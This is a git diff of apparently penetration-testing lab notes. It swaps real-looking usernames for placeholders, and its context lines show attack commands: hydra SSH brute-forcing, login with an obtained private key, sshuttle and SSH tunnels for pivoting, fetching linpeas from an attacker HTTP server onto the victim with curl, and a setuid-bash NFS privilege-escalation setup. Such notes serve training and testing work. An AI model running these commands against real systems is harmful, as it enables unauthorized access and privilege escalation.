@@ -210,13 +210,13 @@ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
 ````
 ##### Brute Force
 ````
-hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
+hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
 hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
 ````
 ##### Private key obtained
 ````
 chmod 600 id_rsa
-ssh mario@172.16.138.14 -i id_rsa
+ssh userb@172.16.138.14 -i id_rsa
 ````
 ##### Public key obtained
 ````
@@ -1740,8 +1740,8 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ##### Crakcing with hydra
 ###### ssh
 ````
-hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
-hydra -l megan -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
+hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
+hydra -l userc -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
 ````
 #### Cracking kdbx files
 ````
@@ -2243,7 +2243,7 @@ sshuttle -r sean@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traf
 ````
 sshuttle -r sean@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
 python3 -m http.server 800 # on our kali machine
-ssh megan@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
+ssh userc@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
 ````
 #### ssh port foward
 ##### Linux Enviorment
@@ -2263,10 +2263,10 @@ In local port forwarding, you are forwarding a port on your local machine to a r
 ````
 ##### Example
 ````
-ssh -L 6070:127.0.0.1:2049 megan@10.1.1.27 -N
+ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N
 ````
 ````
-This command creates an SSH tunnel between your local computer and a remote computer at IP address 10.1.1.27, with the user "megan". The tunnel forwards all traffic sent to port 6070 on your local computer to port 2049 on the remote computer, which is only accessible via localhost (127.0.0.1). The "-N" flag tells SSH to not execute any commands after establishing the connection, so it will just stay open and forward traffic until you manually terminate it. This is commonly used for securely accessing network services that are not directly accessible outside of a certain network or firewall.
+This command creates an SSH tunnel between your local computer and a remote computer at IP address 10.1.1.27, with the user "userc". The tunnel forwards all traffic sent to port 6070 on your local computer to port 2049 on the remote computer, which is only accessible via localhost (127.0.0.1). The "-N" flag tells SSH to not execute any commands after establishing the connection, so it will just stay open and forward traffic until you manually terminate it. This is commonly used for securely accessing network services that are not directly accessible outside of a certain network or firewall.
 
 #notes we did not use proxychains on this. just as the setup was above
 ````
@@ -2762,11 +2762,11 @@ Notice that the /srv share has root squashing disabled. Because of this, on our 
 ##### Setup
 ````
 sshuttle -r sea@10.11.1.251 10.1.1.0/24 #setup
-ssh -L 6070:127.0.0.1:2049 megan@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
+ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
 mkdir /mnt/tmp
-scp megan@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
+scp userc@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
 chown root:root bash; chmod +s bash #change ownership and set sticky bit
-ssh megan@10.1.1.27 #login to victim computer
+ssh userc@10.1.1.27 #login to victim computer
 ````
 ##### Exploit
 ````
